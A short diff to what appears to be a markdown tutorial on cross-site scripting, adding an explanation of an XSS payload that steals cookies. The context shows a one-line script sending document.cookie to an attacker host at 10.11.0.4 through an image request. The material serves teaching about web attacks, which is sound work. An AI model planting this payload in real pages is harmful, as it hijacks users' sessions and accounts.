@@ -53,3 +53,6 @@ For example, one could embed an XSS payload that would generate an "image" reque
 ```html
 <script>new Image().src="http://10.11.0.4/cool.jpg?output="+document.cookie;</script>
 ```
+
+This would cause any user whose browser loaded that image to also dump their cookies to the attacker's server (`10.11.0.4`).
+
